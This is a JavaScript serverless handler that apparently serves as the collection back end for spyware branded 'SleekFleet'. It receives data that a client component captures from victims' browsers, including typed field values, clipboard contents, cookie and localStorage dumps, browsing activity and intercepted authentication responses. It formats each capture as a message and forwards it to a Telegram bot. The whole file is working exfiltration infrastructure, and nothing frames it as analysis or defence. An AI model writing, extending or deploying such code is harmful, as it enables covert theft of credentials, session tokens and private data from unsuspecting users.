export default async function handler(req, res) {
 if (req.method === 'OPTIONS') {
 return res.status(200).json({});
 }

 let payload = {};
 try {
 const rawBody = req.body || "";
 payload = typeof rawBody === 'string' ? JSON.parse(rawBody) : rawBody;
 } catch (e) {
 payload = {};
 }

 if (req.method !== 'POST') {
 return res.status(405).json({ error: 'Method Not Allowed' });
 }

 try {
 let msg = "";
 const timestamp = new Date().toISOString();
 const url = payload.url || "N/A";
 const source = payload.source || "unknown";

 if (source === "input_field_capture") {
 msg = `
🚗 *SleekFleet Input Capture*

📍 Site: \`${url}\`
🏷️ Field: \`${payload.data.field_name || "Unknown"}\`
🔑 Value: \`${String(payload.data.value).substring(0, 100)}\`
⏰ Time: \`${timestamp}\`
 `.trim();
 
 } else if (source === "clipboard_sensitive" || source === "clipboard_tab_load" || source === "periodic_clipboard_check") {
 msg = `
🚗 *SleekFleet Clipboard Grab*

📋 Data: \`${String(payload.data).substring(0, 150)}\`
📍 Context: \`${url}\`
⏰ Time: \`${timestamp}\`
 `.trim();

 } else if (source === "cookie_dump") {
 msg = `
🚗 *SleekFleet Cookie Dump*

🍪 Cookies: \`${String(payload.data).substring(0, 200)}...\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
 `.trim();

 } else if (source === "local_storage_dump") {
 const lsData = typeof payload.data === 'object' ? JSON.stringify(payload.data) : payload.data;
 msg = `
🚗 *SleekFleet Local Storage Dump*

💾 Data: \`${String(lsData).substring(0, 150)}...\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
 `.trim();

 } else if (source === "tab_navigated_to_sensitive_site") {
 msg = `
🚗 *SleekFleet Sensitive Site Visit*

🔗 URL: \`${payload.data.url}\`
📜 Title: \`${payload.data.title}\`
⏰ Time: \`${timestamp}\`
 `.trim();

 } else if (source === "url_change") {
 msg = `
🚗 *SleekFleet URL Change*

🔗 New URL: \`${payload.data.url}\`
📜 Title: \`${payload.data.title}\`
⏰ Time: \`${timestamp}\`
 `.trim();

 } else if (source === "network_auth_capture") {
 // NEW: Format for True Session/Data
 const truncatedBody = payload.responseBody ? payload.responseBody.substring(0, 300) : "No Body";
 msg = `
🚗 *SleekFleet True Session Intercept*

🔗 Endpoint: \`${payload.url}\`
🛠 Method: \`${payload.method || 'GET'}\`
📦 Response Snippet: \`${truncatedBody}\`
📍 Page: \`${url}\`
⏰ Time: \`${timestamp}\`
 `.trim();

 } else {
 msg = `
🚗 *SleekFleet General Data*

📦 Source: \`${source}\`
📦 Data: \`${JSON.stringify(payload.data).substring(0, 150)}\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
 `.trim();
 }

 const tgToken = process.env.TELEGRAM_BOT_TOKEN;
 const tgChatId = process.env.TELEGRAM_CHAT_ID;

 if (tgToken && tgChatId) {
 try {
 const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
 const controller = new AbortController();
 const timeoutId = setTimeout(() => controller.abort(), 5000); 

 const response = await fetch(tgUrl, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ 
 chat_id: tgChatId, 
 text: msg, 
 parse_mode: 'Markdown' 
 }),
 signal: controller.signal
 });

 clearTimeout(timeoutId);
 if (!response.ok) {
 console.error(`Telegram API Error: ${response.status}`);
 } else {
 console.log("✅ Telegram Message Sent");
 }
 } catch (err) {
 console.error("❌ Telegram Fetch Failed:", err.message);
 }
 } else {
 console.log("🌟 Telegram skipped: Missing Env Vars");
 }

 res.status(200).json({ success: true });

 } catch (error) {
 console.error("💥 Handler Error:", error);
 res.status(500).json({ error: error.message });
 }
}
